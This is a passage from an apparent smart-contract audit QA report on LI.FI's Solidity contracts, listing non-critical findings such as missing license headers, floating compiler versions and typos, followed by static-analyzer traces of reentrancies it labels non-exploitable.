src/Interfaces/IAnyswapToken.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/IAnyswapToken.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n8. File: src/Interfaces/ILiFi.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ILiFi.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n9. File: src/Interfaces/ICBridge.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ICBridge.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n10. File: src/LiFiDiamond.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/LiFiDiamond.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n11. File: src/Facets/OwnershipFacet.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/OwnershipFacet.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n12. File: src/Facets/Swapper.sol (line [0](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/Swapper.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n\n### Non-library/interface files should use fixed compiler versions, not floating ones\n\n1. File: src/LiFiDiamond.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/LiFiDiamond.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n2. File: src/Facets/DexManagerFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/DexManagerFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n3. File: src/Facets/NXTPFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n4. File: src/Facets/OwnershipFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/OwnershipFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n5. File: src/Facets/HopFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/HopFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n6. File: src/Facets/Swapper.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/Swapper.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n7. File: src/Facets/GenericSwapFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/GenericSwapFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n8. File: src/Facets/DiamondCutFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/DiamondCutFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n9. File: src/Facets/WithdrawFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n10. File: src/Facets/AnyswapFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n11. File: src/Facets/DiamondLoupeFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/DiamondLoupeFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n12. File: src/Facets/CBridgeFacet.sol (line [2](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n\n### `2**<n> - 1` should be re-written as `type(uint<n>).max`\n\n1. File: src/Libraries/LibSwap.sol (line [8](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibSwap.sol#L8))\n```solidity\n    uint256 private constant MAX_INT = 2**256 - 1;\n```\n2. File: src/Libraries/LibAsset.sol (line [15](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibAsset.sol#L15))\n```solidity\n    uint256 private constant MAX_INT = 2**256 - 1;\n```\n\n### Typos\n\n1. File: src/Interfaces/ITransactionManager.sol (line [77](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Interfaces/ITransactionManager.sol#L77))\n```solidity\n     *                      the inforamtion that does change between chains\n```\ninforamtion\n\n2. File: src/LiFiDiamond.sol (line [11](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/LiFiDiamond.sol#L11))\n```solidity\n        // Add the diamondCut external function from the diamondCutFacet\n```\ndiamondCutFacet -> _diamondCutFacet\n\n3. File: src/Facets/DexManagerFacet.sol (line [28](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/DexManagerFacet.sol#L28))\n```solidity\n    /// @notice Batch register the addresss of DEX contracts to be approved for swapping.\n```\naddresss\n\n4. File: src/Facets/HopFacet.sol (line [131](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/HopFacet.sol#L131))\n```solidity\n     * @dev Conatains the business logic for the bridge via Hop Protocol\n```\nConatains\n\n\n### Non-exploitable reentrancies\nCode should follow the best-practice of the [Checks-Effects-Interactions](https://docs.soliditylang.org/en/v0.4.21/security-considerations.html#re-entrancy) pattern\n```\nReentrancy in NXTPFacet._startBridge(bytes32,ITransactionManager.PrepareArgs) (src/Facets/NXTPFacet.sol#175-188):\n\tExternal calls:\n\t- LibAsset.approveERC20(IERC20(sendingAssetId),address(s.nxtpTxManager),_nxtpData.amount) (src/Facets/NXTPFacet.sol#180)\n\t- result = s.nxtpTxManager.prepare{value: value}(_nxtpData) (src/Facets/NXTPFacet.sol#185)\n\tExternal calls sending eth:\n\t- result = s.nxtpTxManager.prepare{value: value}(_nxtpData) (src/Facets/NXTPFacet.sol#185)\n\tEvent emitted after the call(s):\n\t- NXTPBridgeStarted(_transactionId,result.transactionId,result) (src/Facets/NXTPFacet.sol#187)\nReentrancy in NXTPFacet.completeBridgeTokensViaNXTP(ILiFi.LiFiData,address,address,uint256) (src/Facets/NXTPFacet.sol#124-140):\n\tExternal calls:\n\t- LibAsset.transferFromERC20(assetId,msg.sender,address(this),amount) (src/Facets/NXTPFacet.sol#134)\n\t- LibAsset.transferAsset(assetId,address(receiver),amount) (src/Facets/NXTPFacet.sol#137)\n\tEvent emitted after the call(s):\n\t- LiFiTransferCompleted(_lifiData.transactionId,assetId,receiver,amount,block.timestamp) (src/Facets/NXTPFacet.sol#139)\nReentrancy in AnyswapFacet.startBridgeTokensViaAnyswap(ILiFi.LiFiData,AnyswapFacet.AnyswapData) (src/Facets/AnyswapFacet.sol#35-66):\n\tExternal calls:\n\t- underlyingToken = IAnyswapToken(_anyswapData.token).underlying() (src/Facets/AnyswapFacet.sol#36)\n\t- _anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE() (src/Facets/AnyswapFacet.sol#37)\n\t- LibAsset.transferFromERC20(underlyingToken,msg.sender,address(this),_anyswapData.amount) (src/Facets/AnyswapFacet.sol#43)\n\t- _startBridge(_anyswapData) (src/Facets/AnyswapFacet.sol#53)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- underlyingToken = IAnyswapToken(_anyswapData.token).underlying() (src/Facets/AnyswapFacet.sol#134)\n\t\t- underlyingToken == IAnyswapRouter(_anyswapData.router).wNATIVE() (src/Facets/AnyswapFacet.sol#136)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOutNative{value: _anyswapData.amount}(_anyswapData.token,_anyswapData.recipient,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#137-141)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(underlyingToken),_anyswapData.router,_anyswapData.amount) (src/Facets/AnyswapFacet.sol#149)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying(_anyswapData.token,_anyswapData.recipient,_anyswapData.amount,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#151-156)\n\t\t- LibAsset.approveERC20(IERC20(_anyswapData.token),_anyswapData.router,_anyswapData.amount) (src/Facets/AnyswapFacet.sol#159)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOut(_anyswapData.token,_anyswapData.recipient,_anyswapData.amount,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#161-166)\n\tExternal calls sending eth:\n\t- _startBridge(_anyswapData) (src/Facets/AnyswapFacet.sol#53)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOutNative{value: _anyswapData.amount}(_anyswapData.token,_anyswapData.recipient,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#137-141)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/AnyswapFacet.sol#55-65)\nReentrancy in CBridgeFacet.startBridgeTokensViaCBridge(ILiFi.LiFiData,CBridgeFacet.CBridgeData) (src/Facets/CBridgeFacet.sol#57-84):\n\tExternal calls:\n\t- LibAsset.transferFromERC20(_cBridgeData.token,msg.sender,address(this),_cBridgeData.amount) (src/Facets/CBridgeFacet.sol#61)\n\t- _startBridge(_cBridgeData) (src/Facets/CBridgeFacet.sol#71)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- ICBridge(bridge).sendNative(_cBridgeData.receiver,_cBridgeData.amount,_cBridgeData.dstChainId,_cBridgeData.nonce,_cBridgeData.maxSlippage) (src/Facets/CBridgeFacet.sol#150-156)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibAsset.approveERC20(IERC20(_cBridgeData.token),bridge,_cBridgeData.amount) (src/Facets/CBridgeFacet.sol#159)\n\t\t- ICBridge(bridge).send(_cBridgeData.receiver,_cBridgeData.token,_cBridgeData.amount,_cBridgeData.dstChainId,_cBridgeData.nonce,_cBridgeData.maxSlippage) (src/Facets/CBridgeFacet.sol#161-168)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\tExternal calls sending eth:\n\t- _startBridge(_cBridgeData) (src/Facets/CBridgeFacet.sol#71)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/CBridgeFacet.sol#73-83)\nReentrancy in HopFacet.startBridgeTokensViaHop(ILiFi.LiFiData,HopFacet.HopData) (src/Facets/HopFacet.sol#61-87):\n\tExternal calls:\n\t- LibAsset.transferFromERC20(sendingAssetId,msg.sender,address(this),_hopData.amount) (src/Facets/HopFacet.sol#67)\n\t- _startBridge(_hopData) (src/Facets/HopFacet.sol#74)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- LibAsset.approveERC20(IERC20(sendingAssetId),bridge,_hopData.amount) (src/Facets/HopFacet.sol#149)\n\t\t- IHopBridge(bridge).sendToL2{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.destinationAmountOutMin,_hopData.destinationDeadline,address(0),0) (src/Facets/HopFacet.sol#155-163)\n\t\t- IHopBridge(bridge).swapAndSend{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.bonderFee,_hopData.amountOutMin,_hopData.deadline,_hopData.destinationAmountOutMin,_hopData.destinationDeadline) (src/Facets/HopFacet.sol#167-176)\n\tExternal calls sending eth:\n\t- _startBridge(_hopData) (src/Facets/HopFacet.sol#74)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- IHopBridge(bridge).sendToL2{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.destinationAmountOutMin,_hopData.destinationDeadline,address(0),0) (src/Facets/HopFacet.sol#155-163)\n\t\t- IHopBridge(bridge).swapAndSend{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.bonderFee,_hopData.amountOutMin,_hopData.deadline,_hopData.destinationAmountOutMin,_hopData.destinationDeadline) (src/Facets/HopFacet.sol#167-176)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/HopFacet.sol#76-86)\nReentrancy in NXTPFacet.startBridgeTokensViaNXTP(ILiFi.LiFiData,ITransactionManager.PrepareArgs) (src/Facets/NXTPFacet.sol#46-76):\n\tExternal calls:\n\t- LibAsset.transferFromERC20(sendingAssetId,msg.sender,address(this),_nxtpData.amount) (src/Facets/NXTPFacet.sol#55)\n\t- _startBridge(_lifiData.transactionId,_nxtpData) (src/Facets/NXTPFacet.sol#63)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.approveERC20(IERC20(sendingAssetId),address(s.nxtpTxManager),_nxtpData.amount) (src/Facets/NXTPFacet.sol#180)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- result = s.nxtpTxManager.prepare{value: value}(_nxtpData) (src/Facets/NXTPFacet.sol#185)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\tExternal calls sending eth:\n\t- _startBridge(_lifiData.transactionId,_nxtpData) (src/Facets/NXTPFacet.sol#63)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- result = s.nxtpTxManager.prepare{value: value}(_nxtpData) (src/Facets/NXTPFacet.sol#185)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/NXTPFacet.sol#65-75)\n\t- NXTPBridgeStarted(_transactionId,result.transactionId,result) (src/Facets/NXTPFacet.sol#187)\n\t\t- _startBridge(_lifiData.transactionId,_nxtpData) (src/Facets/NXTPFacet.sol#63)\nReentrancy in LibSwap.swap(bytes32,LibSwap.SwapData) (src/Libraries/LibSwap.sol#29-58):\n\tExternal calls:\n\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tExternal calls sending eth:\n\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tEvent emitted after the call(s):\n\t- AssetSwapped(transactionId,_swapData.callTo,_swapData.sendingAssetId,_swapData.receivingAssetId,fromAmount,toAmount,block.timestamp) (src/Libraries/LibSwap.sol#49-57)\nReentrancy in NXTPFacet.swapAndCompleteBridgeTokensViaNXTP(ILiFi.LiFiData,LibSwap.SwapData[],address,address) (src/Facets/NXTPFacet.sol#150-171):\n\tExternal calls:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/NXTPFacet.sol#159)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- LibAsset.transferAsset(finalAssetId,address(receiver),finalBalance) (src/Facets/NXTPFacet.sol#167)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/NXTPFacet.sol#159)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tEvent emitted after the call(s):\n\t- LiFiTransferCompleted(_lifiData.transactionId,finalAssetId,receiver,finalBalance,block.timestamp) (src/Facets/NXTPFacet.sol#170)\nReentrancy in AnyswapFacet.swapAndStartBridgeTokensViaAnyswap(ILiFi.LiFiData,LibSwap.SwapData[],AnyswapFacet.AnyswapData) (src/Facets/AnyswapFacet.sol#74-123):\n\tExternal calls:\n\t- underlyingToken = IAnyswapToken(_anyswapData.token).underlying() (src/Facets/AnyswapFacet.sol#79)\n\t- _anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE() (src/Facets/AnyswapFacet.sol#80)\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#88)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#88)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tEvent emitted after the call(s):\n\t- AssetSwapped(transactionId,_swapData.callTo,_swapData.sendingAssetId,_swapData.receivingAssetId,fromAmount,toAmount,block.timestamp) (src/Libraries/LibSwap.sol#49-57)\n\t\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#88)\nReentrancy in AnyswapFacet.swapAndStartBridgeTokensViaAnyswap(ILiFi.LiFiData,LibSwap.SwapData[],AnyswapFacet.AnyswapData) (src/Facets/AnyswapFacet.sol#74-123):\n\tExternal calls:\n\t- underlyingToken = IAnyswapToken(_anyswapData.token).underlying() (src/Facets/AnyswapFacet.sol#79)\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#99)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#99)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tEvent emitted after the call(s):\n\t- AssetSwapped(transactionId,_swapData.callTo,_swapData.sendingAssetId,_swapData.receivingAssetId,fromAmount,toAmount,block.timestamp) (src/Libraries/LibSwap.sol#49-57)\n\t\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#99)\nReentrancy in AnyswapFacet.swapAndStartBridgeTokensViaAnyswap(ILiFi.LiFiData,LibSwap.SwapData[],AnyswapFacet.AnyswapData) (src/Facets/AnyswapFacet.sol#74-123):\n\tExternal calls:\n\t- underlyingToken = IAnyswapToken(_anyswapData.token).underlying() (src/Facets/AnyswapFacet.sol#79)\n\t- _anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE() (src/Facets/AnyswapFacet.sol#80)\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#88)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#99)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_anyswapData) (src/Facets/AnyswapFacet.sol#110)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- underlyingToken = IAnyswapToken(_anyswapData.token).underlying() (src/Facets/AnyswapFacet.sol#134)\n\t\t- underlyingToken == IAnyswapRouter(_anyswapData.router).wNATIVE() (src/Facets/AnyswapFacet.sol#136)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOutNative{value: _anyswapData.amount}(_anyswapData.token,_anyswapData.recipient,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#137-141)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(underlyingToken),_anyswapData.router,_anyswapData.amount) (src/Facets/AnyswapFacet.sol#149)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying(_anyswapData.token,_anyswapData.recipient,_anyswapData.amount,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#151-156)\n\t\t- LibAsset.approveERC20(IERC20(_anyswapData.token),_anyswapData.router,_anyswapData.amount) (src/Facets/AnyswapFacet.sol#159)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOut(_anyswapData.token,_anyswapData.recipient,_anyswapData.amount,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#161-166)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#88)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/AnyswapFacet.sol#99)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_anyswapData) (src/Facets/AnyswapFacet.sol#110)\n\t\t- IAnyswapRouter(_anyswapData.router).anySwapOutNative{value: 